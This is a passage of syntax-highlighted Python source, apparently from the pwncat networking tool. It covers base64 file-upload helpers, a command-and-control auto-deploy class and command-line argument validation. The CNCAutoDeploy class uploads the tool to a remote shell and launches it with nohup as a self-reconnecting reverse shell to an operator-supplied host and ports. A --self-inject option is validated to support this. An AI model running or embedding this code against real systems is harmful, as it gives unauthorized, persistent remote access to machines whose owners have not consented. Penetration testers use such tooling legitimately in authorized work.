    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__upload_file_base_64_encoded</span>(<span
            class="hljs-params">self, lpath, rpath, at_once=False</span>):</span>
        <span class="hljs-comment"># type: (str, str, bool) -&gt; bool</span>
        <span class="hljs-string">"""Upload a local file to a base64 encoded remote file.

        Args:
            lpath (str): Local path of the file.
            rpath (str): Remote path, where to upload the base64 encoded file.
            at_once (bool): Send all data at once.

        Returns:
            bool: Returns `True` on success and `False` on failure.
        """</span>
        first = <span class="hljs-literal">True</span>
        data = []  <span class="hljs-comment"># type: List[str]</span>

        <span class="hljs-keyword">with</span> open(lpath, <span
                            class="hljs-string">"r"</span>) <span class="hljs-keyword">as</span> fhandle:
            lines = fhandle.readlines()
            count = len(lines)
            curr = <span class="hljs-number">1</span>
            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:
                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> at_once:
                    self.print_info(
                        <span class="hljs-string">"Uploading: {} -&gt; {} ({}/{})"</span>.format(lpath, rpath, curr, count), <span
                            class="hljs-literal">False</span>, <span
                            class="hljs-literal">True</span>
                    )
                b64 = StringEncoder.decode(base64.b64encode(StringEncoder.encode(line)))
                <span class="hljs-keyword">if</span> first:
                    <span class="hljs-keyword">if</span> at_once:
                        data.append(<span class="hljs-string">'echo "{}" &gt; "{}"'</span>.format(b64, rpath))
                    <span class="hljs-keyword">else</span>:
                        self.remote_command(<span class="hljs-string">'echo "{}" &gt; "{}"'</span>.format(b64, rpath), <span
                            class="hljs-literal">False</span>)
                    first = <span class="hljs-literal">False</span>
                <span class="hljs-keyword">else</span>:
                    <span class="hljs-keyword">if</span> at_once:
                        data.append(<span class="hljs-string">'echo "{}" &gt;&gt; "{}"'</span>.format(b64, rpath))
                    <span class="hljs-keyword">else</span>:
                        self.remote_command(<span
                            class="hljs-string">'echo "{}" &gt;&gt; "{}"'</span>.format(b64, rpath), <span
                            class="hljs-literal">False</span>)
                curr += <span class="hljs-number">1</span>

        <span class="hljs-keyword">if</span> at_once:
            self.print_info(<span class="hljs-string">"Uploading: {} -&gt; {} ({}/{})"</span>.format(lpath, rpath, <span
                            class="hljs-number">1</span>, <span class="hljs-number">1</span>))
            self.remote_command(<span class="hljs-string">"\n"</span>.join(data), <span
                            class="hljs-literal">False</span>)
        <span class="hljs-keyword">else</span>:
            self.print_info()

        <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> md5 check if this is legit</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__remote_base64_decode</span>(<span
            class="hljs-params">self, rpath_source, rpath_target</span>):</span>
        <span class="hljs-comment"># type: (str, str) -&gt; bool</span>
        <span class="hljs-string">"""Decode a remote base64 encoded file with pure Python.

        Args:
            rpath_source (str): The remote path to the existing base64 encoded file.
            rpath_target (str): The remote path to the desired base64 decoded file.

        Returns:
            bool: Returns `True` on success or `False` on failure.
        """</span>
        self.flush_receive()

        command = []
        command.append(<span class="hljs-string">"{} -c 'import base64;"</span>.format(self.__remote_python))
        command.append(<span class="hljs-string">'f=open("{}", "r");'</span>.format(rpath_source))
        command.append(<span class="hljs-string">"lines = f.readlines();"</span>)
        <span class="hljs-keyword">if</span> self.__remote_py3:
            command.append(
                <span class="hljs-string">'print((b"".join([base64.b64decode(l.encode()) for l in lines])).decode());\''</span>
            )
        <span class="hljs-keyword">else</span>:
            command.append(<span class="hljs-string">'print "".join([base64.b64decode(l) for l in lines]);\''</span>)
        command.append(<span class="hljs-string">'&gt; "{}"'</span>.format(rpath_target))

        self.print_info(<span class="hljs-string">"Decoding: {} -&gt; {}"</span>.format(rpath_source, rpath_target))
        self.remote_command(<span class="hljs-string">""</span>.join(command), <span
                            class="hljs-literal">False</span>)
        <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> validate via md5</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>


<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [9/11 Command &amp; Control]: (3/3) CNCAutoDeploy</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CNCAutoDeploy</span>(<span
        class="hljs-params">CNC</span>):</span>
    <span class="hljs-string">"""Command&amp;Control pwncat auto deployment class."""</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">
        self,
        network,  <span class="hljs-comment"># type: IONetwork</span>
        cmd,  <span class="hljs-comment"># type: str</span>
        host,  <span class="hljs-comment"># type: str</span>
        ports,  <span class="hljs-comment"># type: List[int]</span>
    </span>):</span>
        <span class="hljs-comment"># type: (...) -&gt; None</span>
        <span class="hljs-keyword">try</span>:
            super(CNCAutoDeploy, self).__init__(network)
        <span class="hljs-keyword">except</span> CNCPythonNotFound:
            <span class="hljs-keyword">return</span>

        local_path = os.path.abspath(__file__)
        remote_path = self.create_remote_tmpfile()
        remote_stdout = self.create_remote_tmpfile()
        remote_stderr = self.create_remote_tmpfile()
        <span class="hljs-keyword">if</span> remote_path <span class="hljs-keyword">is</span> <span
                            class="hljs-literal">None</span>:
            self.print_info(<span class="hljs-string">"Unable to create tmpfile. Aborting and handing over to current shell."</span>)
            <span class="hljs-keyword">return</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.upload(local_path, remote_path):
            self.print_info(<span class="hljs-string">"Unable to upload file. Aborting and handing over to current shell."</span>)
            <span class="hljs-keyword">return</span>
        self.__start_pwncat(remote_path, cmd, host, ports, remote_stdout, remote_stderr)

        <span class="hljs-comment"># We need to wait some time for slow severs</span>
        self.print_info(<span class="hljs-string">"Waiting for socket"</span>)
        time.sleep(<span class="hljs-number">2</span>)
        self.flush_receive()

        self.print_info(<span class="hljs-string">"Done. Handing over to current shell."</span>)
        <span class="hljs-keyword">return</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__start_pwncat</span>(<span
            class="hljs-params">self, remote_path, binary, host, ports, stdout, stderr</span>):</span>
        <span class="hljs-comment"># type: (str, str, str, List[int], Optional[str], Optional[str]) -&gt; None</span>
        <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> ports:
            command = []
            command.append(<span class="hljs-string">"nohup"</span>)
            command.append(self.remote_python)
            command.append(remote_path)
            command.append(host)
            command.append(str(port))
            command.append(<span class="hljs-string">"--exec {}"</span>.format(binary))
            command.append(<span class="hljs-string">"--reconn"</span>)
            command.append(<span class="hljs-string">"--reconn-wait 1"</span>)
            <span class="hljs-keyword">if</span> stdout <span class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span
                            class="hljs-literal">None</span> <span class="hljs-keyword">and</span> stderr <span
                            class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
                command.append(<span class="hljs-string">"&gt; {}"</span>.format(stdout))
                command.append(<span class="hljs-string">"2&gt; {}"</span>.format(stderr))
            <span class="hljs-keyword">elif</span> stdout <span class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
                command.append(<span class="hljs-string">"&gt; {} 2&gt;&amp;1"</span>.format(stdout))
            <span class="hljs-keyword">elif</span> stderr <span class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
                command.append(<span class="hljs-string">"&gt; {} 2&gt;&amp;1"</span>.format(stderr))
            command.append(<span class="hljs-string">"&amp;"</span>)
            data = <span class="hljs-string">" "</span>.join(command)
            print(<span class="hljs-string">"Starting pwncat rev shell: {}"</span>.format(data))
            self.remote_command(data, <span class="hljs-literal">False</span>)


<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># ###</span>
<span class="hljs-comment"># ###   10 / 11   C O M M A N D   L I N E   A R G U M E N T S</span>
<span class="hljs-comment"># ###</span>
<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># #################################################################################################</span>

<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [19/11 COMMAND LINE ARGUMENTS]: (1/2) Helper Functions</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_version</span>():</span>
    <span class="hljs-comment"># type: () -&gt; str</span>
    <span class="hljs-string">"""Return version information."""</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">"""%(prog)s: Version %(version)s (%(url)s) by %(author)s"""</span> % (
        {<span class="hljs-string">"prog"</span>: APPNAME, <span
                            class="hljs-string">"version"</span>: VERSION, <span
                            class="hljs-string">"url"</span>: APPREPO, <span class="hljs-string">"author"</span>: <span
                            class="hljs-string">"cytopia"</span>}
    )


<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ArgValidator</span>(<span
        class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""Validate command line arguments."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Private Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__get_port_list_by_comma</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; List[int]</span>
        <span class="hljs-string">"""Returns a list of ports from a comma separated string or empty list if invalid."""</span>
        ports = []
        match = re.search(<span class="hljs-string">r"^[0-9]+(,([0-9]+))*$"</span>, value)
        <span class="hljs-keyword">if</span> match <span class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
            ports = [int(port) <span class="hljs-keyword">for</span> port <span
                            class="hljs-keyword">in</span> match.group(<span
                            class="hljs-number">0</span>).split(<span class="hljs-string">","</span>)]
            <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> ports:
                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ArgValidator.is_valid_port(port):
                    <span class="hljs-keyword">return</span> []
        <span class="hljs-keyword">return</span> ports

<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__get_port_list_by_range</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; List[int]</span>
        <span class="hljs-string">"""Returns a list of ports from a range string or empty list if invalid."""</span>
        ports = []  <span class="hljs-comment"># type: List[int]</span>
        match = re.search(<span class="hljs-string">r"^[0-9]+\-[0-9]+$"</span>, value)
        <span class="hljs-keyword">if</span> match <span class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
            ranges = [int(r) <span class="hljs-keyword">for</span> r <span
                            class="hljs-keyword">in</span> match.group(<span
                            class="hljs-number">0</span>).split(<span class="hljs-string">"-"</span>)]
            ports = list(range(ranges[<span class="hljs-number">0</span>], ranges[<span
                            class="hljs-number">1</span>] + <span class="hljs-number">1</span>))
            <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> ports:
                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ArgValidator.is_valid_port(port):
                    <span class="hljs-keyword">return</span> []
        <span class="hljs-keyword">return</span> ports

<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__get_port_list_by_incr</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; List[int]</span>
        <span class="hljs-string">"""Returns a list of ports from an increment or empty list if invalid."""</span>
        ports = []  <span class="hljs-comment"># type: List[int]</span>
        match = re.search(<span class="hljs-string">r"^[0-9]+\+[0-9]+$"</span>, value)
        <span class="hljs-keyword">if</span> match <span class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
            ranges = [int(r) <span class="hljs-keyword">for</span> r <span
                            class="hljs-keyword">in</span> match.group(<span
                            class="hljs-number">0</span>).split(<span class="hljs-string">"+"</span>)]
            ports = list(range(ranges[<span class="hljs-number">0</span>], ranges[<span
                            class="hljs-number">0</span>] + ranges[<span
                            class="hljs-number">1</span>] + <span class="hljs-number">1</span>))
            <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> ports:
                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ArgValidator.is_valid_port(port):
                    <span class="hljs-keyword">return</span> []
        <span class="hljs-keyword">return</span> ports

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Helper Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_valid_port</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (int) -&gt; bool</span>
        <span class="hljs-string">"""Returns True if a given value is a valid port."""</span>
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> &lt; value &lt; <span
                            class="hljs-number">65536</span>

<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_valid_port_list</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; bool</span>
        <span class="hljs-string">"""Returns True if a given value is a valid port list by comma or range."""</span>
        cports = ArgValidator.__get_port_list_by_comma(value)
        rports = ArgValidator.__get_port_list_by_range(value)
        iports = ArgValidator.__get_port_list_by_incr(value)
        <span class="hljs-comment"># XOR - only one method (comma, range or increment) is allowed</span>
        <span class="hljs-keyword">if</span> cports <span class="hljs-keyword">and</span> <span
                            class="hljs-keyword">not</span> rports <span
                            class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> iports:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">if</span> rports <span class="hljs-keyword">and</span> <span
                            class="hljs-keyword">not</span> cports <span
                            class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> iports:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">if</span> iports <span class="hljs-keyword">and</span> <span
                            class="hljs-keyword">not</span> cports <span
                            class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> rports:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_port_list_from_string</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; List[int]</span>
        <span class="hljs-string">"""Returns a list of ports from an comma, range or increment."""</span>
        cports = ArgValidator.__get_port_list_by_comma(value)
        rports = ArgValidator.__get_port_list_by_range(value)
        iports = ArgValidator.__get_port_list_by_incr(value)
        <span class="hljs-keyword">return</span> cports + rports + iports

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Generic Type Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">type_port</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; int</span>
        <span class="hljs-string">"""Check argument for valid port."""</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ArgValidator.is_valid_port(int(value)):
            <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                            class="hljs-string">"%s is an invalid port number."</span> % value)
        <span class="hljs-keyword">return</span> int(value)

<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">type_port_list</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; List[int]</span>
        <span class="hljs-string">"""Check argument for valid port list separated by comma or range number."""</span>
        rports = ArgValidator.__get_port_list_by_range(value)
        cports = ArgValidator.__get_port_list_by_comma(value)
        iports = ArgValidator.__get_port_list_by_incr(value)

        <span class="hljs-comment"># Only use comma, range or increment!</span>
        <span class="hljs-keyword">if</span> (rports <span
                            class="hljs-keyword">and</span> cports) <span
                            class="hljs-keyword">or</span> (rports <span
                            class="hljs-keyword">and</span> iports) <span
                            class="hljs-keyword">or</span> (cports <span
                            class="hljs-keyword">and</span> iports):
            <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(
                <span class="hljs-string">"%s is invalid. Can only use comma, range or increment."</span> % value
            )
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> rports <span
                            class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> cports <span
                            class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> iports:
            <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                            class="hljs-string">"%s is an invalid port-list/range definition."</span> % value)
        <span class="hljs-comment"># Return whichever has a value</span>
        <span class="hljs-keyword">return</span> rports + cports + iports

<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">type_file_content</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; str</span>
        <span class="hljs-string">"""Check argument for valid file content (file must exist and be readable)."""</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isfile(value):
            <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                            class="hljs-string">"File not found: %s"</span> % value)
        <span class="hljs-keyword">with</span> open(value, mode=<span class="hljs-string">"r"</span>) <span
                            class="hljs-keyword">as</span> fhandle:
            script = fhandle.read()
        <span class="hljs-keyword">return</span> script

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Specific Type Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">type_tos</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; str</span>
        <span class="hljs-string">"""Check argument for valid --tos value."""</span>
        <span class="hljs-keyword">if</span> value <span class="hljs-keyword">not</span> <span
                            class="hljs-keyword">in</span> [<span
                            class="hljs-string">"mincost"</span>, <span class="hljs-string">"lowcost"</span>, <span
                            class="hljs-string">"reliability"</span>, <span class="hljs-string">"throughput"</span>, <span
                            class="hljs-string">"lowdelay"</span>]:
            <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                            class="hljs-string">"%s is an invalid tos definition."</span> % value)
        <span class="hljs-keyword">return</span> value

<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">type_info</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; str</span>
        <span class="hljs-string">"""Check argument for valid --info value."""</span>
        <span class="hljs-keyword">if</span> value <span class="hljs-keyword">not</span> <span
                            class="hljs-keyword">in</span> [<span class="hljs-string">"sock"</span>, <span
                            class="hljs-string">"ipv4"</span>, <span
                            class="hljs-string">"ipv6"</span>, <span
                            class="hljs-string">"tcp"</span>, <span class="hljs-string">"all"</span>, <span
                            class="hljs-string">""</span>]:
            <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                            class="hljs-string">"%s is an invalid info definition."</span> % value)
        <span class="hljs-keyword">return</span> value

<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">type_crlf</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (Optional[str]) -&gt; Optional[str]</span>
        <span class="hljs-string">"""Check argument for valid --crlf value."""</span>
        <span class="hljs-keyword">if</span> value <span class="hljs-keyword">is</span> <span
                            class="hljs-literal">None</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
        <span class="hljs-keyword">if</span> value.lower() <span
                            class="hljs-keyword">in</span> [<span class="hljs-string">"crlf"</span>, <span
                            class="hljs-string">"lf"</span>, <span class="hljs-string">"cr"</span>, <span
                            class="hljs-string">"no"</span>]:
            <span class="hljs-keyword">return</span> value.lower()
        <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                            class="hljs-string">"'%s' is an invalid choice."</span> % value)

<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">type_color</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; str</span>
        <span class="hljs-string">"""Check argument for valid --color value."""</span>
        <span class="hljs-keyword">if</span> value <span class="hljs-keyword">not</span> <span
                            class="hljs-keyword">in</span> [<span class="hljs-string">"auto"</span>, <span
                            class="hljs-string">"always"</span>, <span
                            class="hljs-string">"never"</span>]:
            <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                            class="hljs-string">"%s is an invalid color definition."</span> % value)
        <span class="hljs-keyword">return</span> value

<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">type_local</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; str</span>
        <span class="hljs-string">"""Check argument for valid -L/--local value."""</span>
        match = re.search(<span class="hljs-string">r"^(.+:)?([0-9]+)$"</span>, value)
        <span class="hljs-keyword">if</span> match <span class="hljs-keyword">is</span> <span
                            class="hljs-literal">None</span> <span class="hljs-keyword">or</span> len(match.groups()) != <span
                            class="hljs-number">2</span>:
            <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                            class="hljs-string">"%s is not a valid '[addr:]port' format."</span> % value)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ArgValidator.is_valid_port(int(match.group(<span
                            class="hljs-number">2</span>))):
            <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                            class="hljs-string">"%s is not a valid port."</span> % value)

        <span class="hljs-keyword">if</span> match.group(<span class="hljs-number">1</span>) <span
                            class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">":"</span> + match.group(<span
                            class="hljs-number">2</span>)
        <span class="hljs-keyword">return</span> value

<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">type_remote</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; str</span>
        <span class="hljs-string">"""Check argument for valid -R/--remote value."""</span>
        match = re.search(<span class="hljs-string">r"(.+):(.+)"</span>, value)
        <span class="hljs-keyword">if</span> match <span class="hljs-keyword">is</span> <span
                            class="hljs-literal">None</span> <span class="hljs-keyword">or</span> len(match.groups()) != <span
                            class="hljs-number">2</span>:
            <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                            class="hljs-string">"%s is not a valid 'addr:port' format."</span> % value)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ArgValidator.is_valid_port(int(match.group(<span
                            class="hljs-number">2</span>))):
            <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                            class="hljs-string">"%s is not a valid port."</span> % value)
        <span class="hljs-keyword">return</span> value

<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">type_self_inject</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; str</span>
        <span class="hljs-string">"""Check argument for valid --self-inject value."""</span>
        opts = value.split(<span class="hljs-string">":"</span>)
        <span class="hljs-keyword">if</span> len(opts) != <span class="hljs-number">3</span>:
            <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                            class="hljs-string">"%s is not a valid cmd:host:port[s] pattern."</span> % value)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ArgValidator.is_valid_port_list(opts[<span
                            class="hljs-number">-1</span>]):
            <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                            class="hljs-string">"%s is an invalid port definition."</span> % value)
        <span class="hljs-keyword">return</span> value


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_args_check_mutually_exclusive</span>(<span
        class="hljs-params">parser, args</span>):</span>
    <span class="hljs-comment"># type: (argparse.ArgumentParser, argparse.Namespace) -&gt; None</span>
    <span class="hljs-string">"""Check mutually exclusive arguments."""</span>
    <span class="hljs-comment"># This is connect mode</span>
    connect_mode = <span class="hljs-keyword">not</span> args.listen <span
                            class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> args.zero <span
                            class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> args.local <span
                            class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> args.remote

    <span class="hljs-comment"># [MODE] --listen</span>
    <span class="hljs-keyword">if</span> args.listen <span class="hljs-keyword">and</span> (args.zero <span
                            class="hljs-keyword">or</span> args.local <span
                            class="hljs-keyword">or</span> args.remote):
        parser.print_usage()
        print(
            <span class="hljs-string">"%s: error: -l/--listen mutually excl. with -z/-zero, -L or -R"</span> % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(<span class="hljs-number">1</span>)

    <span class="hljs-comment"># [MODE] --zero</span>
    <span class="hljs-keyword">if</span> args.zero <span class="hljs-keyword">and</span> (args.listen <span
                            class="hljs-keyword">or</span> args.local <span
                            class="hljs-keyword">or</span> args.remote):
        parser.print_usage()
        print(
            <span class="hljs-string">"%s: error: -z/--zero mutually excl. with -l/--listen, -L or -R"</span> % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(<span class="hljs-number">1</span>)

    <span class="hljs-comment"># [MODE]--local</span>
    <span class="hljs-keyword">if</span> args.local <span class="hljs-keyword">and</span> (args.listen <span
                            class="hljs-keyword">or</span> args.zero <span
                            class="hljs-keyword">or</span> args.remote):
        parser.print_usage()
        print(
            <span class="hljs-string">"%s: error: -L/--local mutually excl. with -l/--listen, -z/--zero or -R"</span> % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(<span class="hljs-number">1</span>)

    <span class="hljs-comment"># [MODE] --remote</span>
    <span class="hljs-keyword">if</span> args.remote <span class="hljs-keyword">and</span> (args.listen <span
                            class="hljs-keyword">or</span> args.zero <span
                            class="hljs-keyword">or</span> args.local):
        parser.print_usage()
        print(
            <span class="hljs-string">"%s: error: -R/--remote mutually excl. with -l/--listen, -z/--zero or -L"</span> % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(<span class="hljs-number">1</span>)

    <span class="hljs-comment"># [MODULE] --exec</span>
    <span class="hljs-keyword">if</span> args.cmd <span class="hljs-keyword">and</span> (args.local <span
                            class="hljs-keyword">or</span> args.remote <span
                            class="hljs-keyword">or</span> args.zero):
        parser.print_usage()
        print(
            <span class="hljs-string">"%s: error: -e/--exec mutually excl. with -L, -R or -z/--zero"</span> % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(<span class="hljs-number">1</span>)

    <span class="hljs-comment"># [OPTIONS] -4 and -6</span>
    <span class="hljs-keyword">if</span> args.ipv4 <span class="hljs-keyword">and</span> args.ipv6:
        parser.print_usage()
        print(
            <span class="hljs-string">"%s: error: -4 and -6 are mutually exclusive"</span> % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(<span class="hljs-number">1</span>)

    <span class="hljs-comment"># [OPTIONS] --source-addr/--source-port</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> connect_mode <span
                            class="hljs-keyword">and</span> (args.source_port <span
                            class="hljs-keyword">or</span> args.source_addr):
        print(
            <span class="hljs-string">"%s: error: --source-addr and --source-port can only be used in connect mode."</span>
            % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(<span class="hljs-number">1</span>)

    <span class="hljs-comment"># [OPTIONS] --source-addr/--source-port</span>
    <span class="hljs-keyword">if</span> (args.source_port <span
                            class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> args.source_addr) <span
                            class="hljs-keyword">or</span> (<span class="hljs-keyword">not</span> args.source_port <span
                            class="hljs-keyword">and</span> args.source_addr):
        print(
            <span class="hljs-string">"%s: error: --source-addr and --source-port are both required."</span> % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(<span class="hljs-number">1</span>)

    <span class="hljs-comment"># [ADVANCED] --http</span>
    <span class="hljs-keyword">if</span> args.http <span class="hljs-keyword">and</span> (args.https <span
                            class="hljs-keyword">or</span> args.udp <span
                            class="hljs-keyword">or</span> args.zero):
        parser.print_usage()
        print(
            <span class="hljs-string">"%s: error: --http mutually excl. with --https, -u/--udp or -z/--zero"</span> % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(<span class="hljs-number">1</span>)

    <span class="hljs-comment"># [ADVANCED] --https</span>
    <span class="hljs-keyword">if</span> args.https <span class="hljs-keyword">and</span> (args.http <span
                            class="hljs-keyword">or</span> args.udp <span
                            class="hljs-keyword">or</span> args.zero):
        parser.print_usage()
        print(
            <span class="hljs-string">"%s: error: --https mutually excl. with --http, -z/--udp or -z/--zero"</span> % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(<span class="hljs-number">1</span>)

    <span class="hljs-comment"># [ADVANCED] --keep-open</span>
    <span class="hljs-keyword">if</span> args.keep_open <span class="hljs-keyword">and</span> (args.udp):
        parser.print_usage()
        print(
            <span class="hljs-string">"%s: error: --keep-open mutually excl. with -u/--udp"</span> % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(<span class="hljs-number">1</span>)
